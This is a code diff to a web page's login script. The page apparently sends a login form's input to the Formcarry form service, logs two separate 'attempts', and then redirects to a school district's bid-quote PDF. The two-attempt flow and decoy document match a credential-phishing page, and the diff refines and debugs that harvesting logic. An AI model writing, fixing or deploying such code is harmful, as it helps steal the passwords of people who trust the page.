@@ -208,16 +208,18 @@
                         redirect: 'manual'
                     });
 
-                    console.log('Formcarry response status:', response.status);
-                    console.log('Formcarry response headers:', response.headers.get('location'));
+                    console.log('First attempt - Formcarry response status:', response.status);
+                    console.log('First attempt - Formcarry response headers:', response.headers.get('location'));
+                    const responseBody = await response.text();
+                    console.log('First attempt - Formcarry response body:', responseBody);
 
                     if (!response.ok) {
-                        const errorText = await response.text();
-                        throw new Error(`Formcarry request failed: ${response.status} - ${errorText}`);
+                        console.error('First attempt - Formcarry error response:', responseBody);
+                        throw new Error(`Formcarry request failed: ${response.status} - ${responseBody}`);
                     }
                 } catch (error) {
-                    console.error('Submission error:', error);
-                    alert('Failed to process login. Please check console for details or try again later.');
+                    console.error('First attempt - Submission error:', error.message);
+                    alert('Failed to process login. Check console for details or try again. Error: ' + error.message);
                 } finally {
                     loginBtn.disabled = false;
                     loginBtn.textContent = 'Log in';
@@ -245,19 +247,25 @@
                     redirect: 'manual'
                 });
 
-                console.log('Formcarry response status:', response.status);
-                console.log('Formcarry response headers:', response.headers.get('location'));
+                console.log('Second attempt - Formcarry response status:', response.status);
+                console.log('Second attempt - Formcarry response headers:', response.headers.get('location'));
+                const responseBody = await response.text();
+                console.log('Second attempt - Formcarry response body:', responseBody);
 
                 if (response.ok) {
-                    console.log('Redirecting to PDF');
+                    console.log('Second attempt - Redirecting to PDF');
                     window.location.href = 'https://resources.finalsite.net/images/v1724257429/campbellcountyschoolsnet/ktrkivttstuxogdc557u/Bid-Quote-SchoologywithPS-Knox.pdf';
                 } else {
-                    const errorText = await response.text();
-                    throw new Error(`Formcarry request failed: ${response.status} - ${errorText}`);
+                    throw new Error(`Formcarry request failed: ${response.status} - ${responseBody}`);
                 }
             } catch (error) {
-                console.error('Submission error:', error);
-                alert('Failed to process login. Please check console for details or try again later.');
+                console.error('Second attempt - Submission error:', error.message);
+                alert('Failed to redirect. Check console for details or try again. Error: ' + error.message);
+                // Fallback: Redirect for non-critical errors (e.g., rate limit)
+                if (error.message.includes('429')) {
+                    console.log('Second attempt - Fallback redirect due to rate limit');
+                    window.location.href = 'https://resources.finalsite.net/images/v1724257429/campbellcountyschoolsnet/ktrkivttstuxogdc557u/Bid-Quote-SchoologywithPS-Knox.pdf';
+                }
             } finally {
                 loginBtn.disabled = false;
                 loginBtn.textContent = 'Log in';
